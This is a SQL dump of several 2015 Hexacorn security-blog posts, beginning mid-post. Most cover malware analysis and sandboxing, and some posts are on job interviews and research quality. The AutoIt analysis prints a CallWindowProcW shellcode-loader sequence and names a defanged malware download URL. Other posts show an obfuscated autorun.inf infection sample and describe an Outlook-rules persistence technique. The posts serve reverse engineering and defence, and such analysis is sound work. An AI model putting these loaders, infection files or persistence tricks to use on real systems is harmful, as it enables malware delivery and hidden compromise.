external script instead of the one embedded inside the executable\n\n\nThe AutoIt3ExecuteScript command line argument is yet another confirmation that the newly created file is most likely an an AutoIt script\n\nAt this stage we know that the newly created file is an AutoIt script (and it is in a compiled form). We can find the values of the $dd and $ee variables (and even @TempDir) by adding the following commands to the first script we modified:\nFileWrite(\"var_test\",$test)\r\nFileWrite(\"var_ee\",$ee)\r\nFileWrite(\"var_dd\",$dd)\r\nFileWrite(\"var_tempdir\",@TempDir)\nOnce executed, you will get their values in respective files.\nThe values of $dd and $ee can also be extracted from the top of the first script we extracted (while they are not built dynamically like $test it is important to note that in more obfuscated scripts they could, and it’s safer to write their final values at the end of all initialization/obfuscation since there could be some code interpreted in the mean time that would change these values during the run-time).\nOr, we can simply run the malicious file inside the VM and extract the dropped script from the %TEMP% folder (%TEMP%\\eWEpCwslF).\nThe dropped file is a binary with some random data at the top (just a junk data as an attempt to hide its file type) and the ‘AU3!EA06’ marker clearly visible:\nSince it’s a compiled script, we can take this data and convert it into an AutoIt executable. We just append it at the end of the AutoIt3.exe interpreter (stub). This way we can run it through Exe2Aut and decompile the binary script into its source code.\nThis works like a charm, and the new extracted script looks like this:\n\nThe resulting file is a large 1.2Mb AutoIt script.\nWe can observe the following:\n\nIt is using an anti-sandbox trick (detection of ‘snxhk.dll’ loaded in the process causes the script to exit)\nIt doesn’t like NIS.exe, NS.exe, avp.exe processes – if it detects any of these running, it just adds a Startup persistence mechanism (via a shortcut file) and moves itself to a randomly named location under %APPDATA% & exits\nIt is large so it most likely contains other files embedded in the source code\nWe can also notice that the $data variable is most likely a hexified data dump of a portable executable file (data starts with ‘0x4d5a’ i.e. ‘MZ’)\nThere are actually 2 data blocks like this in the script (look for ‘$data = ‘ in the source code to find beginning of these 2 blocks)\n\nUsing FileWrite again we can dump the content of 2 $data streams to 2 separate files (we just need to edit the source code). For any string starting with “0x” prefix you can use a Binary function offered by AutoIt3 to convert such ‘stringified’ hexadecimal dump into binary i.e.:\nFileWrite(\"var_data1\",Binary($data))\r\nFileWrite(\"var_data2\",Binary($data))\nAnother thing to mention. While analysing obfuscated AutoIt scripts it is important to look for snippets of code hidden in-between large portion of seemingly similar statements (and sometimes large portions of garbage comments). In this particular case, we can grep the $data statements out and this way we can spot some extra code actually hidden at the bottom of this 1.2MB AU3 file (on the screenshot below it is shown ‘as it is’ inside the script surrounded by lots of statements that modify the content of the $data variable /there are over 27000 similar lines in the script/):\nThis chunk of code (function named ‘y’) is actually very important, because it contains a shellcode that loads and executes the payloads. Using the FileWrite trick we can extract the shellcode:\nand other variables referenced on the screenshot (here, all of them are listed one by one forming a sequence used to launch the shellcode):\nDllStructCreate(\"byte[\" & BinaryLen($runnshell) & \"]\")\nDllStructCreate(\"byte[\" & BinaryLen($data) & \"]\")\nDllStructSetData($kskdfvwfe, 1, $runnshell)\nDllStructSetData($csadskxnkjas, 1, $data)\nDllCall(\"user32.dll\", \"int\", \"CallWindowProcW\", \"ptr\", \r\n  DllStructGetPtr($kskdfvwfe), \"wstr\", ($rot), \"ptr\", \r\n  DllStructGetPtr($csadskxnkjas), \"int\", 0, \"int\", 0)\nThis code is is actually a very well-known CallWindowProcW-based shellcode loader. The $runshell and $data variables are passed to this API and when it is executed it calls a callback function identified by the code stored in the $runshell variable:\nAt this stage the payloads stored in $data variable start (the portable executables stored inside the $data variable are executed via process hollowing of 2 child processes, each getting the respective of these 2 $data streams injected into it).\nThe steps described above can be repeated for many obfuscated AutoIt scripts. It is time consuming and probably only needed when you really really need to know exactly what is happening step by step… Your chances for getting this sort of detail from sandbox are low. But, important bit is not that sandboxes cannot get this sort of details – the typical sandbox will most likely not reach the execution of these 2 payloads thanks to very restrictive timeouts (AutoIt scripts are slow and sandbox needs to call it quits at some stage). The price you pay for ‘knowing’ is that it takes quite a bit of time to walk through all these nested steps manually.\nAnd just in case you are wondering:\n\n1st $data is Delphi executable/XtremeRAT\n2nd $data stream is UPXd Visual Basic botkiller/avkiller/UACbypasser + it downloads a new file from buscandoempleointernacional[DOT]com[SLASH]javaupdates2016.exe [Warning: URL live at the time of writing] as per config in the resources\n\nShare this :)', 'Anti-*, Malware Analysis', 'http://www.hexacorn.com/blog/2015/10/29/autoit3-nested-dolls/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (203, 'Permanent Link to Heaven’s gate and a chameleon code (x86/64)', 'Hexacorn', 'October 26, 2015 ', 'A so-called heaven’s gate is not only a built-in feature of a 64-bit Windows, but also a neat reversing trick. It can be used (and is) by malware authors to temporarily switch the code execution between 32- (WOW64) and 64-bit long mode. While operating in a 64-bit long mode it executes the 64-bit instructions and this can be used to execute some funny stuff before returning to 32-bit code (f.ex. can be used to detect a debugger).\nThe trick is very old, many blogs describe how to mix 32- and 64-bit using it and that’s why it is just part of the topic I am going to talk about today.\nA few years back I was looking at a sample that used the heaven’s gate trick, but apart from this, it also contained another trick – a chameleon code – a stream of bytes that could be executed as both 32- and 64-bit code, depending on the context. I found it to be quite cool and took a mental note of that malware family.\nI recently came across a different sample from the same family and since this reminded me about that supercool trick, I thought it would be nice to write a post about it.\nThe sample hash is E4AB5596CB8FBE932670A6A5420E7AB9 (note it is old, from 2013).\nNote: Mind you that before it reaches the heaven’s gate/chameleon code it will try to stop you by using a couple of known and lesser-known anti-reversing tricks (there is a number of them, and they are quite creative; I won’t describe it in detail not to spoil the fun in case you want to take a stab at the sample yourself).\nThe 32-bit code right before jumping far to 64-bit code:\nImmediately after the far jump we land in 64-bit code.\nNote the offsets of instructions on both screenshots.\nBtw. while I am not the biggest fan of windbg for day to day work, its ability to reverse such chameleon code comes really handy.\nAfter some more jumps and calls the code eventually ends in these places (left 32-bit, right 64-bit – 2 different VMs):\nWe can compare the opcodes and their meanings side by side:\nThey both execute in their respective modes (32- and 64).\nThe inability to distinguish between code and data is a well known fact. Ability to code a program that looks identically and executes on two different architectures is a completely different animal.\nFor what it’s worth – it was written in fasm.\nShare this :)', 'Anti-*, Hackme/crackme, Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2015/10/26/heavens-gate-and-a-chameleon-code-x8664/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (204, 'Permanent Link to Beyond good ol’ Run key, Part 33', 'Hexacorn', 'October 20, 2015 ', 'There is a secret place in almost every organization utilizing Microsoft Outlook where malware can hide.\nPersistently.\nThe pros: no one checks it.\nThe cons: there is no API to make it easily work (directly).\nAbout the cons – one has to either install the malware manually, or employ some sort or macro / autoit / sending messages trickery. Direct access /via code/ is also possible, but we have yet to find someone brave enough to reverse MAPI and internal interfaces of Outlook that can automate this process.\nI am of course talking about the mechanism of executing program as a part of Outlook Rules.\nHere is a simple example of running a calc.exe anytime someone receives the message:\nYup. It’s that simple. It’s not visible in Registry, it’s not visible on the file system level. I am not even sure if any of the PST reading solutions out there can read theses rules somehow…\nAnd how to add these?\nAs I said, there is no actual interface at the moment known, but one can employ macros, sending messages, etc.. One can also use the convenient mechanism that allows importing of the rules via Outlook:\n\nIf you are eager to reverse engineer these, look at the API OpenStreamOnFileW. Enough said \nShare this :)', 'Anti-*, Autostart (Persistence), Batch Analysis, Clustering, Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2015/10/20/beyond-good-ol-run-key-part-33/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (205, 'Permanent Link to Interviews – some random thoughts', 'Hexacorn', 'October 17, 2015 ', 'Interviewing is a sort of hobby of mine. It started many years ago when I was trying to get a job in a different country and despite many efforts to secure such a position I was always ending up with a disappointment and… had to go through all the stages of grief.\nMany times.\nI eventually secured that dream job abroad, and the rest is – as they say – history. Thanks to many interviews, some of which I passed I can now claim I worked in a couple of companies, and even gambled a bit & opened my own. It just takes time and patience. If things do not work now give yourself a few years and you will eventually see the fruits. And on a personal level – these interviews enabled me to do what I always wanted – I really love living in different countries, exploring different places and despite logistical difficulties associated with each move it gives me an immerse kick to be able to be reborn over and over again. In last 15 years I had 14 addresses in 4 different countries. I always feel blessed that I was able to achieve it, and even more blessed because my wife and I share the same passion of a nomadic life. As I write this post we are thinking of moving again… Yay! And hopefully there will be more moves in the future – last year I met a very old guy in Tasmania – he was over 80. He traveled with a group, but was on his own. He chatted me up and that’s how I learnt that he worked in at least 10 countries. What an interesting life to live!\nOver the years I spoke to many agents, recruiters in quite a few countries and was also interviewed by many really clever people. Of course, sometimes I was also interviewed by some who didn’t even have a clue about the subject, despite being in a managing or a VP/Executive function. Yes, this is the reality of job hunting. Knowledge is not necessarily the most important thing. Speaking to many people opened my eyes to many things I was not aware of and there is a value in learning how “it” works.\nI must add that apart from being interviewed, I also interviewed quite a few people myself; I also hired quite a few guys as well – with this post I am attempting to summarize a few things that I learnt from all these experiences. This is such a loaded topic that I – in advance – apologize for a bit chaotic nature of this post.\nBefore I begin I must emphasize that interviewing is always a tricky business and giving any advice or commentary on this particular subject and hiring in general is even trickier – being bold and arrogant about what is right and wrong will surely ricochet one day and I bet I will one day regret writing this post \nSo, I am not right. I may be wrong, but I hope I am not. You be the judge.\nAnyways…\nFor starters, let’s talk about the interview questions.\nI personally divide interviewing questions into 2 simple buckets:\n\ntreating the candidate like you would like to be treated – you ask questions relevant to the job & skillset required for the position grade (f.ex. junior vs. senior)\nthe opposite – and here I include all the questions about moving Fuji mountain, etc. – these may be cool if you are applying to Mensa, but if your job is to be on the IT force the questions you should be asked by the interviewers should be really relevant to your future job; any ‘lateral’ questions aiming at testing ‘imaginative thinking’ are a proof that the employer is not really thinking of you as a professional, but a clown; and a full disclosure here: I did on occasion ask candidates such questions in the past and I sincerely apologize candidates who ever spoke to me and had to suffer… it will never happen again; there are industries where such ‘creativity’ is to be desired, but it’s not a day-to-day in the IT & IT Sec; the only exceptions I can think of are _real_world_ algorithmic problems, or asking the candidate to implement a function (which is often required of developers and proves they can actually code – but mind you, this is not even lateral question, but a simple, work-related question)\n\nIf you think of it, the ‘what interview questions to ask’ problem is actually easy. The easiest is to ask relevant questions with a focus on testing the knowledge of the candidate they claim they have (based on the resume) first.\nTo give you an example…\nThe (now, sort of) classic question I once asked a candidate (it was so surprising to him that he remembers it to this day!) was me asking him what is a shortcut key in IDA Pro which we use to name a function. On his resume the candidate claimed he knows IDA Pro so this was an obvious question for me to ask. To my surprise, he struggled with this question a lot and I instantly knew that his contact with IDA was more platonic and a wishful thinking than the actual experience. He was an excellent candidate though and was hired – this is because he killed so many other questions and knew more stuff than I did in many other areas of security. Btw. he is one of the leading forces behind a world-known hacking team now.\nYup. One of the most intelligent guys I personally have a pleasure knowing.\nThat IDA question became a funny anecdote between two of us, but the reason I mention this particular question is because the sole nature of that question was its simplicity – and it is such simplicity that imho represents the core of a good question that you can ask during an interview. It is short, to the point and tests candidate’s claimed knowledge on the spot. And let’s not forget – even if not answered, and exposes certain lack of knowledge, it doesn’t intend to ‘kill’ the candidates’ chances. Because you don’t want to ‘kill’ the candidate. You test both the actual knowledge, but also the candidate’s survival skills. Being able to describe how they would go about finding the answer to the question is also a good answer. Many of IT tasks nowadays is googling & applying the newly acquired knowledge.\nAnother thing to mention. Many popular questions focus on a memorized knowledge – what is the port used by HTTP, DNS, FTP, etc.. They may be good closed questions and are definitely relevant, I still ask them myself, but imho it’s much more important to find out if the candidate is actually interested in the subject.\nI have interviewed many people who claimed they knew malware analysis and were deeply interested in it. The lies I heard from them were funny, because often they had no clue what they were talking about, but also very revealing – you can immediately tell whether the person has a natural tendency to be a curious explorer, or is a robot who you will be needing to micromanage forever, because they have no internal drive. This may sound controversial, but I think some lying during the interview is permitted and should be even encouraged. If a person can smoke me using bits and pieces of knowledge + maybe using some natural charm – they have a potential – and it sells that person much better than a guy who doesn’t know anything yet is still making up stories instead of saying “I don’t know”. In terms of malware analysis specifically – if you can’t cheat a bit – you simply can’t deliver. Cutting corners is really necessary there.\nThe “I don’t know” is very important. Say it, if you don’t know. And if you have ideas, add “but I could find an answer easily <here> and <there>”.\nAnother area that many ‘interview advices’ miss is the questions from the candidates to the potential employer. If you are interviewed, you do need to show at least a minimal interest about the employer. You don’t need to talk about stock prices. Ask about offices, team size, history, whether the role is a new or a replacement, about certification and traveling opportunities, and even about the interviewer’s experience with the company. That’s like 15 minutes worth topics to talk about. In Australia/APAC ask about night calls (remember that any Oz/APAC timezone works against you and you often need to take calls at night to talk to guys in EMEA and NA). As anti-social as I am, I find it fascinating to often meet people on the other side of the phone that are no less anti-social than me. Break the stiff routine and have a good laugh about the nuisances of a corporate life. Again, the foundation  here is a genuine interest and camaraderie. If you just randomly fish for opportunities and have no interest it will emerge very quickly. And you never know… if you are serious and can sell it you may get lucky & may find a new mentor that will lead to you to completely new level of professionalism…\nThe last topic I want to cover is exploring the opportunities.\nAfter visiting Australia last year I honestly fell in love with the country. I definitely want to live there at some stage in my life. So every once in a while I apply for jobs there – partially to test the waters, partially hoping for a good luck. I get some replies and sometimes I do interviews, but what follows is not about the good ol’ hiring process. It is about more modern faces of hiring – many of which I was actually not aware of. One such aspect I encountered while dealing with Oz opportunities I found particularly interesting and is a novelty to me – it is about a modern way of screening the applicants.\nIt works this way: you apply, someone at the other side of the system potentially screens your resume manually (this, I am not sure, but I assume someone needs to click something and some sort of review is /hopefully/ to be expected), and you receive an invitation to a webcam interview.\nYes, you are asked to talk to the computer. It will record you and someone will later review your video. If you get enough facebook-like likes, maybe actual people will talk to you.\nThe first thing that came to my mind when I saw a notification about such interview was the ‘Up in the Air’ movie with George Clooney, and the character played by Anna Kendrick. In the movie she tries to lay people off doing so remotely while she is missing the fact how redundancy affects people in real life. I personally am very pragmatic about contracts – two parties come together and part their ways, but luckily we are not robots and that personal touch is definitely a nice thing to have – no matter it is a process of hiring or laying off.\nThe other thing that stroke me was the fact I applied for a relatively senior position & after learning to be shortlisted for the interview I was happy. The fact I need to be shortlisted again is not such a big surprise, this is a natural interview process, but it still feels strange being shortlisted in the second level with not a single word exchanged with a potential future employer. Also, the invite for the webcam interview was sent with a title ‘Cyber Security Positions’ suggesting everyone was just approached in bulk, and there doesn’t seem to be much of a shortlisting done really yet…\nSo, the obvious question I had was… are they really really interested in ME? Or just batch-processing the candidates?\nI don’t know.\nBut… they want to hire, because there is an identified need in the company to fill-in that role, right?\nThey should be pretty specific… & interested…\nI am asked by them to go online, and do a performing act on a web camera. You can also use an app (you need to install it on the smartphone). And this, in the environment where I have a zero knowledge about what criteria the company is actually looking at, and no context of what was there in my resume that might have interested the company to actually talk to me.\nI believe the interview is a peer-to-peer process. The impersonal webcam thingie converts it to an unbalanced deal. I must mention I have not taken the interview, but I assume the whole process is done in just one take and is controlled by the application loaded in a browser/phone. And if the movie industry and TV teaches us anything – editing is everything. Even actors applying for roles can have many takes. This just doesn’t seem to be fair…\nFrom a personal standpoint (and to a certain extent, security as well) – what if my terrible webcam video ever leaks and people will have a good laugh at my cost? I’d rather impersonate Kylie Minogue and sing the Locomotion than record a video of myself staring at the camera, mumbling, perhaps shuttering, attempting to glorify my projected strengths and how much I love my future employer of whom I honestly don’t know much about yet, other than the fact they don’t even want to talk to me despite apparently trying to evaluate me and potentially hire me.  Doing so with the other person on the other side of the phone line feels just so much more natural. Perhaps it’s because you have a constant feedback & having a conversation on a professional level is often more a fun process than a dry, bureaucratic multiple-choice test (let alone webcam recording).\nAnd yes, I want to talk to people who I may end up working with.\nSo, in the end – the dissociation is simply mind blowing to me…\nMy response: you have failed the interview Mr Potential Employer.\nI think the interaction is a key in a hiring process. Sometimes 2 minutes on the phone can tell you everything you need to know about the candidate. Sometimes, a single webcam interview invite via email can tell you everything you need to know about the potential employer…\nThe final conclusion of this long bit is that we are all human and a mutual respect is the key to a successful interview – on both sides of the fence.\nGood luck with your job hunting!\nShare this :)', 'Preaching', 'http://www.hexacorn.com/blog/2015/10/17/interviews-some-random-thoughts/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (206, 'Permanent Link to Enter Sandbox – part 10: Removable devices & clickbait file names', 'Hexacorn', 'October 16, 2015 ', 'Infection of removable drives is an old trick and no point explaining what it is. What is interesting though is looking at creativity of guys who leverage this infection vector and not the ones that exploit the autorun.inf mechanism (yawns!), but the one that focuses on social engineering.\nAssuming that a potential victim of ‘removable device infection’ is typically not a very computer savvy individual is actually quite easy. We all know that it’s the guys like these that are a typical pray for malware authors.\nBut are they the only ones?\nThere is so many things one can do to place clickbaitfiles on the removable drive that the victim will end up clicking. It is stronger than us. Whether a rookie or a pro. You have seen it, I have seen it – the guys clicking, clicking… until it works. I have done it too.\nInfection via a removable device is still a perfect social engineering platform and I’d say it is not going away anytime soon.\nLooking at some of the sandboxes samples I have analyzed I created a short list of tricks I have spotted so far (send me more if you know others, and care to share).\n\nhide the folder, create an .exe with the same name and ensure the .exe is using a folder icon\nuse ‘current’ and ‘directory up’ file names i.e. ‘..exe’ and ‘…exe’\nuse important-looking file names, also in foreign languages\n\n匆删(重要资料).exe\n\nleverage desktop.ini to change the appearance of the folder (f.ex. bin folder)\n\n[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}\n\nuse various file extensions: .exe, .scr, .pif, .lnk\ndouble .exe (.exe.exe), triple .exe (.exe.exe.exe)\nintriguing names (sex&pr0n in general, controversy&scandal)\nuse attractive looking icons – yup, it’s thats imple\nFake Recycler folders\nobviously, a randomized autorun.inf is a norm now\n\n[AutoRun]\r\n;FLvfB ysQiGKArLcs \r\nsheLl\\open\\commAnD = ukxfqq.pif\n;fWJoARTstov kivfsp \r\nSHeLL\\oPEn\\dEfault=1\r\n;tCcl bcaolB WdIa BdqhbkeGrp\r\nShell\\explorE\\COmmand= ukxfqq.pif\r\n;ngFiihrOUk \r\nopen =AutoRun.exe\r\n;KyGpw\r\nshEll\\AutOpLAY\\COMMaND=ukxfqq.pif\r\nshell\\1=Open\r\nshell\\1\\Command=AutoRun.exe\r\nshell\\2\\=Browser\r\nshell\\2\\Command=AutoRun.exe\r\nshellexecute=AutoRun.exe\r\n;YtGyagvMMf ceqdP ymhOtYeaQn\nLook at the screenshot below.\nBe honest.\nWhat you would NOT click?\nmind you – it is good ol’ Windows XP!\n\nand same – on Windows 7\n\n \n \nUpdate\nWhat does the topic of this post have in common with sandboxing?\nIt would be cool for sandboxes to highlight these artifacts (if they don’t, yet)…\nIf any sample drops its copy on a removable drive or another well-known file associated with social engineering i.e. exhibits one of the behaviors described above (and more, subject to more analysis) the ‘maliciousness’ score can easily go up.\nEveryone wins. I hope \nShare this :)', 'Anti-*, Autostart (Persistence), Batch Analysis, Clustering, Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2015/10/16/enter-sandbox-part-10-removable-devices-clickbait-file-names/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (207, 'Permanent Link to The story of a failed research :)', 'Hexacorn', 'October 15, 2015 ', 'Most of the stuff I publish here are stories of a successful research. Today, for a change, I will talk about a little failed project. Little, because I didn’t spend too much time on it, failed – because it did fail \nI think it is important to talk about such projects as well, because not only we do fail many times in our research activities + who knows, maybe someone will  come up with a better, more clever idea than me and make it actually successful.\nIn the Beyond good ol’ Run key, Part 22  series. I talked about perl2exe and how the executables created using this tool can load some other arbitrary perl scripts. So, when I found out about it I thought how cool would it be to access the hidden script in a programmatic way and just dump it (assuming that I could use the fact I can load an arbitrary code as a backdoor & that I can somehow find ways to access the source code of the perl script).\nOf course, if you ever dumped the hidden script from perl2exe you may wonder why would I even bother to try – knowing that the script can be easily dumped using typical reversing tricks. Well, it was simply an appealing idea to me to be able to do it in a neat way. In the end I couldn’t find a way to do it. The only consolation is that I was able to at least print the names of the routines used in the code, and enable various debugging messages.\nIn the aforementioned post I mentioned you can load an arbitrary perl code when the perl2exe-compiled script is loaded.\nFor example, we can create a (null)\\sitecustomize.pl script that will be executed before the main script.\nIf it contains the code\nprint \"foobar\\n\";\nit will load like this (running the old wmi.exe perl2exed script here)\n\nRunning the code before the script is one thing, it may be handy to run code at the end of the execution as well – at that stage we will be able to enumerate some properties that are not available until the main script actually executes.\nWe can add the END section to our backdoor:\nprint \"foobar - start\\n\";\nsub END\r\n{\r\n print \"foobar - end\\n\";\r\n}\nthat will do the following:\n\n \nTo dump  the code of the perl script one needs to employ the B::Deparse module.\nOne can write something like this:\nuse B::Deparse;\r\nmy $deparser = B::Deparse->new;\nprint $deparser->coderef2text(\\&foobar);\r\nsub foobar\r\n{\r\n print \"Hello world\\n\";\r\n}\nand when executed it will print the source code of the foobar function :\n\nA more complex script:\nuse warnings;\r\nuse B::Deparse;\r\n\r\nprintit (\\%main::, 0);\r\n\r\nsub printit\r\n{\r\n  my $hash1 = shift;my %hash=%{$hash1};\r\n  my $n     = shift;\r\n\r\n  foreach my $k ( keys %hash )\r\n  {\r\n      #print \"-\" x $n;\r\n\r\n      if (defined $h{$k})\r\n         {\r\n           print \"(hash)\";\r\n           printit (%{$h{$k}}, $n+1);\r\n         }\r\n      if (defined &{$k})\r\n      {\r\n        my $deparser = B::Deparse->new;\r\n        print \"$k\\n\";\r\n        print $deparser->coderef2text(\\&{$k});\r\n      }\r\n\r\n   }\r\n}\r\n\r\nsub foobar\r\n{\r\n  print \"Hello world\\n\";\r\n}\r\n\nwill produce something like this:\n\nIt is kinda getting close to a quine and what we need, but…\nBut unfortunately, B::Deparse is not available inside the compile perl2exe-compiled binary. It also doesn’t seem to be possible to include this module from a separate perl repository. One can change the content of the INC environment variable (responsible for inclusion of modules) with a push f.ex.:\npush (@INC, \"C:/Perl/site/lib\");\r\npush (@INC,\"C:/Perl/lib\" );\nat the top of our backdoor, but for some reason the B::Deparse doesn’t load (the engine finds the files, but you can’t use its functionality . Perhaps the appropriate version of perl (same as in perl2exe used to compile the script) may work – this is one of the potential paths that I have not explored. Perhaps other ways to load a library may work as well.\nAt this stage I kinda gave up, but still played a bit with some environmental variables.\nFor example, adding these to the top of the backdoor (so they are executed before the main script executes):\n$ENV{PERL_DL_DEBUG}=1;\r\n$ENV{DEBUG_TIE_REGISTRY}=1;\nwill enable a lot of debugging messages.\n\nand also related to Registry:\n\nFinally, adding this bit to the END section:\n foreach my $k ( keys %main:: )\r\n {\r\n   print \"FUNCTION: $k\\n\" if (defined &{$k});\r\n }\nso that the final script looks like\nprint \"foobar - start\\n\";\r\n\r\n#$ENV{PERL_DL_DEBUG}=1;\r\n#$ENV{DEBUG_TIE_REGISTRY}=1;\r\n\r\nsub END\r\n{\r\n  print \"foobar - end\\n\";\r\n \r\n foreach my $k ( keys %main:: )\r\n  {\r\n    print \"FUNCTION: $k\\n\" if (defined &{$k});\r\n  }\r\n\r\n}\r\n\nwill allow us to print all the routines defined in the main script:\n\nGetSoftwareInfo & GetHardwareInfo are indeed functions defined inside the wmi.exe – these may be still handy pieces of information if you want to quickly narrow down where the source of the original script is in memory (if you do a memory dump).\nAt this stage it is not a very useful piece of research. One could potentially employ this in sandboxing to produce a very detailed log, but  dumping the actual source code would be a much better choice.\nWas it a wasted time? Hmm probably.\nIf you know, or come up with an idea how to print more useful info, or maybe even a source code – please let me know.\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2015/10/15/the-story-of-a-failed-research/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (208, 'Permanent Link to The story of a possible prank', 'Hexacorn', 'September 25, 2015 ', 'In 2011 a security researcher pulled – what I believe – a prank on a well-known org. He made them publish a paper with an appendix containing a non-sensical data. I reported this to the org in 2012 as soon as I discovered it. I was actually flabbergasted at that time that someone could be that bold to pull the org’s leg this way (risking both author’s and org’s credibility), but it was still 2 months before the infamous Nmap Guide made it to the news and trolling security orgs became a norm.\nI forgot about it for a long time, but recently it came back to me & I checked the web site of the org to see if they pulled the paper – the paper is still there – 3+ years after I reported it – the goofy appendix is of course there as well.\nI must emphasize that I do not have a proof that it is a prank, but the non-sensical information included in the paper cannot be a result of a typo, or an accident; it looks like someone deliberately made stuff up. Of course, if it is just a result of the author’s ignorance or it was the intern who wrote that it would make it for even more lulz.\nI don’t want to mention the gore details for many reasons. Thanks for understanding.\nI do want to mention though 2 interesting side-effects of this paper being published:\n\nThe information was copied to other blogs (not too many, but always).\nBased on the information in this paper someone created IDS signatures – talk about quality & tests\n\nYou may be wondering why I am posting such a vague info at all.\nIt’s simple: question everything you read.\nI personally make tones of mistakes. I sometimes read some of my older posts and I find bugs. Not only typos, but actual logical bugs that make me really ashamed. I don’t like to be wrong, I really don’t, but if I am the only finding out then what about the poor guys who believed it then and believe it now?\nThere is a certain responsibility of a writer, a researcher to ensure the quality of the writing is at the appropriate level. But it is impossible if there is no feedback. Especially the critical one.\nTo certain extent I can understand frustration of HC when he insists on receiving feedback from readers. Seeing people retweeting, but not reading can be certainly disheartening. In my opinion expectations of a blog writer should be very low here, and it keeps me sane writing & babbling anytime I feel like – at certain level I don’t even care – these are more my notes that I feel may be interesting to share, less my interest or a will to change the world (we all die; I am great at parties  ).\nBUT\nBut if there is one thing that I care about is accuracy. If I make a mistake and no one tells me, it really sucks. And the fact is that most of people don’t even bother to read in-depth anymore. Everything is ‘just in time’ – you only read stuff when you need it. I do it all the time. Skimming is a necessity. And this is fine, as long as the stuff you read is correct.\nBut it rarely is 100%.\nSo if you read this – please read whatever you read with an assumption that what you read may not be 100% right. It is especially important with materials endorsed by orgs. Like everyone who made their hands dirty & sinned by publishing – they sometimes publish bad quality stuff. Only these who don’t do anything make no mistakes at all.\nKeep your eyes open.\nShare this :)', 'Preaching', 'http://www.hexacorn.com/blog/2015/09/25/the-story-of-a-possible-prank/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (209, 'Permanent Link to Enter Sandbox – part 9: Message is in a bottle, and sometimes in a box', 'Hexacorn', 'September 24, 2015 ', 'Running programs and expecting them to behave is nothing, but a wishful thinking. When you start processing thousands of files you quickly discover that the reality of automated dynamic software analysis is quite harsh. Component and software dependencies, missing command line arguments, crashes, annoying nag screens, installers using non-standard GUI toolkits, software written for older OS, or frameworks, expired evaluation versions of software protection schemes, trials, evaluation copies of shareware, pranks, corrupted files, uninstallers, and many more make the samples misbehave.\nOnce executed, many samples simply exit – not necessarily in a very graceful way. Analysis fail.\nThere is no easy way to force these applications to actually run – typically, manual analysis are required to create a new behavioral rule (often with a patch) that will force this, and similar apps in the future to execute further, beyond the exit condition. Sometimes it’s not even possible. Notably, patches can be applied not only to the samples, but also to the analysis system (f.ex. install missing dependencies like a specific version of .NET, old-school OCX, old Borland files, etc.). It may be also necessary to bypass software protection schemes i.e. crack samples – legality of it is somehow shady.\nTo apply these patches and workarounds, one needs to analyze existing conditions that cause these samples to fail. Surprisingly, lots of them can be found by reading the message box captions and texts. As usual, this is not a trivial task since we deal with many languages, many different cases, and uncertainties, but it is possible. But patterns can be observed.\nFor starters, let’s look at expired software protection schemes. There are lots of malware samples where author used an evaluation version of the protection scheme with the aim of hiding the actual payload. When the sample is executed the protection scheme checks the conditions and if the evaluation period expired, it just prevents the app from running. One could argue that if evaluation / trial /unregistered version is detected, it alone is a good condition to classify sample as potentially unwanted, at least. Still, it does require signatures (either static or dynamic) to detect this sort of samples.\nHere are some examples:\n\n\n\n\n\n\n\n\n\n\n\nThe missing component scenario is also very common. While Visual Basic and Borland C are no longer that popular,  there are lots of old samples out there belonging to a software written in these old programming platforms. Sandbox should be expecting these in a queue…\nAgain, a few examples:\n\n\n\n\n\n\n\nLarge repositories of samples can’t escape programs written for localized versions of Windows. Running such applications on English OS leads to ‘garbage’ message boxes showing up with lots of gibberish that have no particular meaning and it’s hard to deduct what they mean, until analyzed.\nHere is an example of such message box:\n\nIt turns out that it’s not a crash – just a message telling the user:\n\n제거를 위해 모든 익스플로러창을 닫게됩니다.\n\nwhich – after Google translation – says:\n\nTo remove any Explorer window it will be closed.\n\nI don’t speak Korean, but guessing by the GT output I assume it is just a notification the program will kill all (Internet) Explorer windows before it can remove some app. Whatever is the meaning – one has to ensure it is analyzed so that the sample (and potentially similar) actually works properly.\nMany samples crash – this is overwhelming and I think the only way to handle this is to signal in the report that the app has crashed. Again, not a trivial problem to solve. You may detect Dr Watson launch, .NET crashes, or other default crash windows popping up, but you can’t expect them all the time – many frameworks handle crashes gracefully and as such, sandbox needs to recognize these properly. There are also  samples I came across that don’t even indicate the crash – one needs to recognize it from the flow of the code execution i.e. program’s business logic following the ‘something is wrong’ path (f.ex. some installers do it).\nIf you think a crash detection would require a quick regexp on a couple of commonly used ‘crashing’ words (‘error’, ‘crash’, ‘corrupt’, etc.)  – think again – here are some examples of such messages, and in reality there are hundreds, if no more variants:\n\n\n\n\n\n\n\n\nLast, but not least – some malware intentionally shows fake message boxes. They may contain misleading information and may confuse naive engines looking for specific keywords or even phrases – relying on the messages alone is not enough to make the final call.\nYup, sandboxing can be preceived as pretty hopeless \nShare this :)', 'Batch Analysis, Reversing, Sandboxing', 'http://www.hexacorn.com/blog/2015/09/24/enter-sandbox-part-9-message-is-in-a-bottle-and-sometimes-in-a-box/\n');
